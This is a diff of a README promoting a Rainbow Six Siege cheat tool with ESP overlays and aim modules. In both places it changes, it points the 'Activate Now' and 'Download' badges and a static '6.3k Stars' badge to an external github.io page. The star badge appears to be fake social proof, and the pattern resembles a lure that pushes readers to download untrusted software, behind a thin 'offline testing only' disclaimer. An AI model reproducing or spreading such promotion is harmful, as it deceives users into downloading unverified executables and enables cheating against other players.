@@ -11,10 +11,10 @@ Rainbow Six Siege is built on tension, timing, and information. This cheat tool 
 \[!WARNING]
 This software is intended for **testing, private training, and offline modes only**.
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-blue?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-green?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 6.3k Stars](https://img.shields.io/badge/⭐️%206.3k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-red?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-blue?style=for-the-badge\&logo=rocket)](https://rainbow-six-siege-tool.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-green?style=for-the-badge\&logo=windows)](https://rainbow-six-siege-tool.github.io/.github/)
+[![⭐️ 6.3k Stars](https://img.shields.io/badge/⭐️%206.3k-Stars-yellow?style=for-the-badge\&logo=github)](https://rainbow-six-siege-tool.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-red?style=for-the-badge\&logo=github)](https://rainbow-six-siege-tool.github.io/.github/)
 
 ---
 
@@ -106,9 +106,9 @@ The **Rainbow Six Siege Cheat Software** combines **ESP overlays**, **aim module
 
 ---
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-blue?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-green?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 6.3k Stars](https://img.shields.io/badge/⭐️%206.3k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-red?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-blue?style=for-the-badge\&logo=rocket)](https://rainbow-six-siege-tool.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-green?style=for-the-badge\&logo=windows)](https://rainbow-six-siege-tool.github.io/.github/)
+[![⭐️ 6.3k Stars](https://img.shields.io/badge/⭐️%206.3k-Stars-yellow?style=for-the-badge\&logo=github)](https://rainbow-six-siege-tool.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-red?style=for-the-badge\&logo=github)](https://rainbow-six-siege-tool.github.io/.github/)
 
 ---
